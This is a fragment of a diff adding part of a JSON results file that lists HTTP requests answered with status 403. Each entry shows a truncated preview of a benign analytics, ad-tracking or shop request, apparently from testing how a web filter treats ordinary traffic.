+        "payload_preview": "pvsid=456318427471119&correlator=3671857859513832&eid=31068916,31068924,31068825"
+      },
+      {
+        "status": 403,
+        "payload_preview": "v=1&_v=j96&a=1057859809&t=event&cu=ILS&_s=12&dl=https://www.wetoys.co.il/Checkou"
+      },
+      {
+        "status": 403,
+        "payload_preview": "random=1660199076642&cv=9&fst=1660199076642&num=1&label=j3X_CIGr_o8BEN-B-vUD&bg="
+      },
+      {
+        "status": 403,
+        "payload_preview": "view=cart-json"
+      },
+      {
+        "status": 403,
+        "payload_preview": "appnxsid=4719002886095588578"
+      },
+      {
+        "status": 403,
+        "payload_preview": "c=p3nl8jh61"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/use-iheartradio-on-windows-8&t=1396611515399&n=4755314&k=mainentity"
+      },
+      {
+        "status": 403,
+        "payload_preview": "id=6fb34bb7-52ed-49c3-9c9f-1677965ac102&gdpr=0&gdpr_consent=&redir=https://match"
+      },
+      {
+        "status": 403,
+        "payload_preview": "v=1&_v=j96&a=998384890&t=pageview&_s=1&dl=https://www.vans.co.il/classicss/era/e"
+      },
+      {
+        "status": 403,
+        "payload_preview": "mr=t1660638049&mi='2.1605921204.1662448141894'&cs=!t&e=!(viewCart,viewProduct,vi"
+      },
+      {
+        "status": 403,
+        "payload_preview": "cors=true&content-type=application/x-json-stream&client-id=NO_AUTH&client-versio"
+      },
+      {
+        "status": 403,
+        "payload_preview": "pb=!1m5!1m4!1i9!2i141!3i219!4i256!2m3!1e0!2sm!3i619351488!3m17!2sen-US!3sUS!5e18"
+      },
+      {
+        "status": 403,
+        "payload_preview": "gcoAgent=false&live=true&pageName=page.Hotel-Search&guid=4ae01a40-dd05-4412-a41b"
+      },
+      {
+        "status": 403,
+        "payload_preview": "random=1660569676412&cv=9&fst=1660568400000&num=1&bg=ffffff&guid=ON&eid=37663547"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/users/5"
+      }
+    ]
+  }
+}
